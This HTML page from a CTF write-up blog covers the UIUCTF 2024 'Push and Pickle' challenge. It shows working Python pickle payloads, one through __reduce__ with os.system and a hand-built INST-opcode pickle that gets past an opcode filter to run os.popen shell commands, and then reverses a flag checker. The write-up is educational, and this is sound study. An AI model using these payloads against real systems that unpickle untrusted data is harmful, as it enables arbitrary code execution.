<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <link rel="icon" href="/ctf-writeups/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google-site-verification" content="dl1D1u59Q1pKaeEVUFtuHxnfuBFKhks8hA19r7WuxTY">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Judson:ital,wght@0,400;0,700;1,400&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Gabarito:wght@400..900&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght@400..600" rel="stylesheet">
    <title>UIUCTF 2024 - Push and Pickle</title>
    <script type="module" crossorigin="" src="/ctf-writeups/assets/app-3e96d214.js"></script>
    <link rel="stylesheet" href="/ctf-writeups/assets/index-bfc7d520.css">
  <meta property="article:tag" content="UIUCTF 2024"><meta property="article:tag" content="misc"><meta name="description" content="The main challenge file is quite short, as follows:

```python
import pickle
import base64
import sys
import pickletools

def check_flag(flag_guess: str):
  &quot;&quot;&quot;REDACTED FOR PRIVACY&quot;&quot;&quot;

cucumber = base64.b64decode(input(&quot;Give me your best pickle (base64 encoded) to taste! &quot;))

for opcode, _, _ in pickletools.genops(cucumber):
  if opcode.code == &quot;c&quot; or opcode.code == &quot;\x93&quot;:
    print(&quot;Eww! I can't eat dill pickles.&quot;)
    sys.exit(0)

pickle.loads(cucumber)
```

It is clear that the challenge is about exploiting pickle deserialization. Pickles are python objects serialized into a series of bytecode instructions, and by executing the same bytecode the same python object can be reconstructed elsewhere.  Since we're control the pickle that's loaded, we can pretty much execute arbitrary python code, and a quick google search will reveal many possible payloads. Here is an example:

```python:t.py
import pickle, os, base64

class P(object):
    def __reduce__(self):
        return (os.system, (&quot;ls -l&quot;,))

p = pickle.dumps(P())
print(base64.b64encode(p))
```

We can disassemble the bytecode using the picketools module:

```python:t.py
import pickletools

...

print(pickletools.dis(p))
```

The result is as follows:

```plaintext
    0: \x80 PROTO      4
    2: \x95 FRAME      32
   11: \x8c SHORT_BINUNICODE 'posix'
   18: \x94 MEMOIZE    (as 0)
   19: \x8c SHORT_BINUNICODE 'system'
   27: \x94 MEMOIZE    (as 1)
   28: \x93 STACK_GLOBAL
   29: \x94 MEMOIZE    (as 2)
   30: \x8c SHORT_BINUNICODE 'ls -l'
   37: \x94 MEMOIZE    (as 3)
   38: \x85 TUPLE1
   39: \x94 MEMOIZE    (as 4)
   40: R    REDUCE
   41: \x94 MEMOIZE    (as 5)
   42: .    STOP
highest protocol among opcodes = 4
```

However, in the context of the challenge we’re not allowed to use the `c` and `\x93` operations. Looking up the full list of opcodes [on github](https://github.com/python/cpython/blob/main/Lib/pickle.py#L105), we see that these correspond to the `GLOBAL` and `STACK_GLOBAL` operations. These operations are what allow us access to the execution context and to import modules, so without them we cannot access any builtin functions or classes.

I checked through the list of opcodes to see if any could be useful, and also read through the [pickletools source code](https://github.com/python/cpython/blob/main/Lib/pickletools.py#L1153) where each opcode was well documented. I also looked through the `genops` function, hoping to find some inconsistencies in the way opcodes were generated compared to how they were evaluated, but there was nothing. I also explored the possibility that there might be inconsistencies across different pickle protocol versions, but it seems to be handled perfectly with backwards compatibility.

Eventually, while looking through how each opcode was implemented I saw the `load_inst` function:

```python:pickle.py
...

    def load_inst(self):
        module = self.readline()[:-1].decode(&quot;ascii&quot;)
        name = self.readline()[:-1].decode(&quot;ascii&quot;)
        klass = self.find_class(module, name)
        self._instantiate(klass, self.pop_mark())

...
```

It caught my eye because it called the `find_class` method used to import stuff from a module, and it's also used by `GLOBAL` and `STACK_GLOBAL`. Referring back to its documentation in pickletools basically describes `INST` as an older opcode which is now replaced by the `GLOBAL` and `OBJ` opcodes.

```plaintext:
INST is followed by two newline-terminated strings, giving a
module and class name ... self.find_class(module, name) is used
to get a class object.

In addition, all the objects on the stack following the topmost
markobject are gathered into a tuple and popped (along with the
topmost markobject), just as for the TUPLE opcode.
```

So we can use inst to load whatever function we need and gain arbitrary code execution from there!

Now to craft the payload. My first thought was to call something like `__import__(&quot;os&quot;).popen(&quot;<command>&quot;).read()`. First, we call inst with `os` as module name, `popen` as the 'class name', and `<command>` as the argument. Second, we have to load the `getattr` function to access the `read` method. Finally, we add an empty tuple on the stack (since there are no arguments) and invoke the read method using the `REDUCE` opcode.

```python:s.py
from pickle import *
import base64

p = PROTO + b'\x04'
p += MARK
p += MARK
p += MARK
p += STRING + b'&quot;cat chal.py&quot;\n'
p += INST + b'os\npopen\n'
p += STRING + b'&quot;read&quot;\n'
p += INST + b'builtins\ngetattr\n'
p += MARK
p += TUPLE
p += REDUCE
p += INST + b'builtins\nprint\n'
p += STOP

print(base64.b64encode(p))
```

Initially, I submitted the payload with `ls` as the command, however, seeing no `flag.txt` file I output the `chal.py` contents instead, and it is as follows:

```python:chal.py
import pickle
import base64
import sys
import pickletools

def check_flag(flag_guess: str):
  &quot;&quot;&quot;REDACTED FOR PRIVACY&quot;&quot;&quot;

  # What?! How did you find this? Well you won't be able to figure it out from here...
  return pickle.loads(b'\x80\x04\x96+\x00\x00\x00\x00\x00\x00\x00lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8\x94\x8c' + len(flag_guess).to_bytes(1, 'little') + flag_guess.encode() + b'\x94\x8c\x08builtins\x8c\x03all\x93\x94\x94\x8c\x08builtins\x8c\x04list\x93\x94\x94\x8c\x08builtins\x8c\x03map\x93\x94\x94\x8c\x05types\x8c\x08CodeType\x93\x94(K\x01K\x00K\x00K\x01K\x05KCC<|\x00d\x01\x19\x00t\x00t\x01\x83\x01k\x00o:|\x00d\x02\x19\x00t\x02t\x01|\x00d\x01\x19\x00\x19\x00\x83\x01d\x03|\x00d\x01\x19\x00d\x04\x17\x00\x14\x00\x17\x00d\x05\x16\x00k\x02S\x00(NK\x00K\x01K\x02KaK\xcbt\x8c\x03len\x8c\x01b\x8c\x03ord\x87\x8c\x01x\x85\x8c\x08<pickle>\x8c\x08<pickle>K\x07C\x00tR\x940\x8c\x05types\x8c\x0cFunctionType\x93\x94(h\t}(\x8c\x03len\x8c\x08builtins\x8c\x03len\x93\x94\x94\x8c\x01bh\x01\x8c\x03ord\x8c\x08builtins\x8c\x03ord\x93\x94\x94uN)tR\x8c\x08builtins\x8c\tenumerate\x93\x94\x94h\x00\x85R\x86R\x85R\x85R.')

cucumber = base64.b64decode(input(&quot;Give me your best pickle (base64 encoded) to taste! &quot;))

for opcode, _, _ in pickletools.genops(cucumber):
  if opcode.code == &quot;c&quot; or opcode.code == &quot;\x93&quot;:
    print(&quot;Eww! I can't eat dill pickles.&quot;)
    sys.exit(0)

pickle.loads(cucumber)
```

So it seems that there is a second part to this challenge - reversing some pickle bytecode. I disassembled it with pickletools.dis and this was the result:

```plaintext
    0: \x80 PROTO      4
    2: \x96 BYTEARRAY8 bytearray(b'lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8')
   54: \x94 MEMOIZE    (as 0)
   55: \x8c SHORT_BINUNICODE 'uiuctf{guess}'
   70: \x94 MEMOIZE    (as 1)
   71: \x8c SHORT_BINUNICODE 'builtins'
   81: \x8c SHORT_BINUNICODE 'all'
   86: \x93 STACK_GLOBAL
   87: \x94 MEMOIZE    (as 2)
   88: \x94 MEMOIZE    (as 3)
   89: \x8c SHORT_BINUNICODE 'builtins'
   99: \x8c SHORT_BINUNICODE 'list'
  105: \x93 STACK_GLOBAL
  106: \x94 MEMOIZE    (as 4)
  107: \x94 MEMOIZE    (as 5)
  108: \x8c SHORT_BINUNICODE 'builtins'
  118: \x8c SHORT_BINUNICODE 'map'
  123: \x93 STACK_GLOBAL
  124: \x94 MEMOIZE    (as 6)
  125: \x94 MEMOIZE    (as 7)
  126: \x8c SHORT_BINUNICODE 'types'
  133: \x8c SHORT_BINUNICODE 'CodeType'
  143: \x93 STACK_GLOBAL
  144: \x94 MEMOIZE    (as 8)
  145: (    MARK
  146: K        BININT1    1
  148: K        BININT1    0
  150: K        BININT1    0
  152: K        BININT1    1
  154: K        BININT1    5
  156: K        BININT1    67
  158: C        SHORT_BINBYTES b'|\x00d\x01\x19\x00t\x00t\x01\x83\x01k\x00o:|\x00d\x02\x19\x00t\x02t\x01|\x00d\x01\x19\x00\x19\x00\x83\x01d\x03|\x00d\x01\x19\x00d\x04\x17\x00\x14\x00\x17\x00d\x05\x16\x00k\x02S\x00'
  220: (        MARK
  221: N            NONE
  222: K            BININT1    0
  224: K            BININT1    1
  226: K            BININT1    2
  228: K            BININT1    97
  230: K            BININT1    203
  232: t            TUPLE      (MARK at 220)
  233: \x8c     SHORT_BINUNICODE 'len'
  238: \x8c     SHORT_BINUNICODE 'b'
  241: \x8c     SHORT_BINUNICODE 'ord'
  246: \x87     TUPLE3
  247: \x8c     SHORT_BINUNICODE 'x'
  250: \x85     TUPLE1
  251: \x8c     SHORT_BINUNICODE '<pickle>'
  261: \x8c     SHORT_BINUNICODE '<pickle>'
  271: K        BININT1    7
  273: C        SHORT_BINBYTES b''
  275: t        TUPLE      (MARK at 145)
  276: R    REDUCE
  277: \x94 MEMOIZE    (as 9)
  278: 0    POP
  279: \x8c SHORT_BINUNICODE 'types'
  286: \x8c SHORT_BINUNICODE 'FunctionType'
  300: \x93 STACK_GLOBAL
  301: \x94 MEMOIZE    (as 10)
  302: (    MARK
  303: h        BINGET     9
  305: }        EMPTY_DICT
  306: (        MARK
  307: \x8c         SHORT_BINUNICODE 'len'
  312: \x8c         SHORT_BINUNICODE 'builtins'
  322: \x8c         SHORT_BINUNICODE 'len'
  327: \x93         STACK_GLOBAL
  328: \x94         MEMOIZE    (as 11)
  329: \x94         MEMOIZE    (as 12)
  330: \x8c         SHORT_BINUNICODE 'b'
  333: h            BINGET     1
  335: \x8c         SHORT_BINUNICODE 'ord'
  340: \x8c         SHORT_BINUNICODE 'builtins'
  350: \x8c         SHORT_BINUNICODE 'ord'
  355: \x93         STACK_GLOBAL
  356: \x94         MEMOIZE    (as 13)
  357: \x94         MEMOIZE    (as 14)
  358: u            SETITEMS   (MARK at 306)
  359: N        NONE
  360: )        EMPTY_TUPLE
  361: t        TUPLE      (MARK at 302)
  362: R    REDUCE
  363: \x8c SHORT_BINUNICODE 'builtins'
  373: \x8c SHORT_BINUNICODE 'enumerate'
  384: \x93 STACK_GLOBAL
  385: \x94 MEMOIZE    (as 15)
  386: \x94 MEMOIZE    (as 16)
  387: h    BINGET     0
  389: \x85 TUPLE1
  390: R    REDUCE
  391: \x86 TUPLE2
  392: R    REDUCE
  393: \x85 TUPLE1
  394: R    REDUCE
  395: \x85 TUPLE1
  396: R    REDUCE
  397: .    STOP
```

It seems to be a flag checker, where the check function represented in python bytecode. I reversed the types.CodeType function call:

```python
types.CodeType(
  argcount=1,
  posonlyargcount=0,
  kwonlyargcount=0,
  nlocals=1,
  stacksize=5,
  flags=67,
  code=b'|\x00d\x01\x19\x00t\x00t\x01\x83\x01k\x00o:|\x00d\x02\x19\x00t\x02t\x01|\x00d\x01\x19\x00\x19\x00\x83\x01d\x03|\x00d\x01\x19\x00d\x04\x17\x00\x14\x00\x17\x00d\x05\x16\x00k\x02S\x00',
  consts=(None, 0, 1, 2, 97, 203),
  names=('len', 'b', 'ord'),
  varnames=('x',),
  filename='<pickle>',
  name='<pickle>',
  firstlineno=7,
  lnotab=b'',
)
```

Now I reversed the python bytecode using the `dis` module:

```plaintext
          0 LOAD_FAST                0 (0)
          2 LOAD_CONST               1 (1)
          4 BINARY_SUBSCR
          6 LOAD_GLOBAL              0 (0)
          8 LOAD_GLOBAL              1 (1)
         10 CALL_FUNCTION            1
         12 COMPARE_OP               0 (<)
         14 JUMP_IF_FALSE_OR_POP    58 (to 116)
         16 LOAD_FAST                0 (0)
         18 LOAD_CONST               2 (2)
         20 BINARY_SUBSCR
         22 LOAD_GLOBAL              2 (2)
         24 LOAD_GLOBAL              1 (1)
         26 LOAD_FAST                0 (0)
         28 LOAD_CONST               1 (1)
         30 BINARY_SUBSCR
         32 BINARY_SUBSCR
         34 CALL_FUNCTION            1
         36 LOAD_CONST               3 (3)
         38 LOAD_FAST                0 (0)
         40 LOAD_CONST               1 (1)
         42 BINARY_SUBSCR
         44 LOAD_CONST               4 (4)
         46 BINARY_ADD
         48 BINARY_MULTIPLY
         50 BINARY_ADD
         52 LOAD_CONST               5 (5)
         54 BINARY_MODULO
         56 COMPARE_OP               2 (==)
         58 RETURN_VALUE
```

So decompiling by hand, this function roughly corresponds to the following:

```python
def f(x):
  if x[0] < len(b):
      return x[1] == (ord(b[x[0]]) + 2 * (x[0] + 97)) % 203
```

I then decompiled the rest of the pickle bytecode by hand and this was the result:

```python
for i, c in enumerate(b'lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8'):
    if i < len(b):
        assert c == (ord(b[i]) + 2 * (i + 97)) % 203
```

So it's quite a straightforward flag checker, I quickly threw together the following script to solve for the flag:

```python:s2.py
flag = ''

for i, c in enumerate(b'lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8'):
    j = 1
    possible = ''
    decoded_c = c + j*203 - 2*(i+97)
    while decoded_c < 128:
        possible += chr(decoded_c) + ' '
        decoded_c = c + j*203 - 2*(i+97)
        j += 1
    flag += possible[0]
    print(possible)

print(flag)
```

This gave the flag:

`uiuctf{N3Ver_Und3r_3stiMate_P1ckles!e2ba24}`

Overall, the main difficulty in the challenge for me was finding the `INST` opcode as the second reversing part was relatively straightforward. I learned quite a bit about pickle bytecode through this, including how frames work and the differences between protocol versions."><meta name="author" content="Jia Jie"></head>
  <body>
    <div id="app" data-server-rendered="true"><div><div class="w-full fixed z-20 bg-[#1e1e1e] flex flex-col items-center transition-transform duration-500"><div class="w-full h-16 flex-shrink-0 flex items-center justify-between px-10 max-sm:px-5 max-sm:h-14"><div class="w-10 h-10 flex flex-col items-center justify-center gap-y-1 cursor-pointer mr-3 xl:hidden" data-v-eaee368e=""><div class="bar b1" data-v-eaee368e=""></div><div class="bar b2" data-v-eaee368e=""></div><div class="bar b3" data-v-eaee368e=""></div></div><span class="text-xl font-semibold">Jia Jie's writeups</span><div class="flex-1"></div><button class="group w-10 h-10 rounded-full grid place-items-center"><i class="material-symbols-outlined text-2xl transition-colors group-hover:text-primary">search</i></button><a href="https://github.com/mkofdwu/ctf-writeups" target="_blank" class="group w-10 h-10 rounded-full grid place-items-center"><svg width="28" height="28" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg" class="transition-colors fill-white group-hover:fill-primary"><path d="M18.0015 3C9.71403 3 3.00153 9.7125 3.00153 18C2.99972 21.1487 3.98943 24.2181 5.83024 26.7727C7.67106 29.3273 10.2695 31.2373 13.257 32.232C14.007 32.3625 14.289 31.9125 14.289 31.518C14.289 31.1625 14.2695 29.982 14.2695 28.725C10.5015 29.4195 9.52653 27.807 9.22653 26.9625C9.05703 26.5305 8.32653 25.2 7.68903 24.843C7.16403 24.5625 6.41403 23.868 7.66953 23.85C8.85153 23.8305 9.69453 24.9375 9.97653 25.3875C11.3265 27.6555 13.482 27.018 14.3445 26.625C14.4765 25.65 14.8695 24.9945 15.3015 24.6195C11.964 24.2445 8.47653 22.95 8.47653 17.2125C8.47653 15.5805 9.05703 14.232 10.014 13.1805C9.86403 12.8055 9.33903 11.268 10.164 9.2055C10.164 9.2055 11.4195 8.8125 14.289 10.7445C15.5101 10.4056 16.7718 10.235 18.039 10.2375C19.314 10.2375 20.589 10.4055 21.789 10.743C24.6585 8.793 25.914 9.207 25.914 9.207C26.739 11.2695 26.214 12.807 26.064 13.182C27.0195 14.232 27.6015 15.5625 27.6015 17.2125C27.6015 22.9695 24.096 24.2445 20.757 24.6195C21.3015 25.0875 21.771 25.9875 21.771 27.3945C21.771 29.4 21.7515 31.0125 21.7515 31.5195C21.7515 31.9125 22.0335 32.3805 22.7835 32.2305C25.7608 31.2249 28.3478 29.3111 30.1805 26.7584C32.0132 24.2056 32.9993 21.1425 33 18C33 9.7125 26.2875 3 18 3H18.0015Z"></path></svg></a><a href="https://mkofdwu.github.io/" target="_blank" class="main-website-btn group h-10 pl-4 pr-2 ml-3 flex items-center font-semibold rounded-full border max-[500px]:hidden transition-all duration-500 hover:border-primary hover:text-black"> main website <i class="material-symbols-outlined text-2xl text-xl ml-2 transition-colors duration-500 group-hover:text-black">arrow_outward</i></a><div class="h-0 hide-scrollbar fixed left-0 top-16 z-10 w-full bg-black overflow-y-auto origin-top duration-300 transition-all xl:hidden max-sm:top-14"><div class="opacity-0 pt-10 duration-300 transition-opacity"><div class="flex flex-col" full-width="true"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Codegate 2025 Quals</span><!--[--><a href="/ctf-writeups/masquerade" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Masquerade</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><a href="/ctf-writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 9</span></a><a href="/ctf-writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Proto Grader</span></a><a href="/ctf-writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a aria-current="page" href="/ctf-writeups/push-and-pickle" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#64A577" stroke-width="2"></path></svg><span class="self-center font-semibold text-primary">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">the other obligatory pyjail</span></a><!--]--></div><!--]--></div></div></div></div><div class="dotted-line-hori z-10 w-[calc(100vw-5rem)] max-sm:w-screen"></div></div><div class="fixed z-10 w-[17.5rem] h-screen overflow-y-hidden flex max-xl:hidden"><div class="flex flex-col hide-scrollbar h-full overflow-y-auto pt-24 pr-8"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Codegate 2025 Quals</span><!--[--><a href="/ctf-writeups/masquerade" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Masquerade</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a 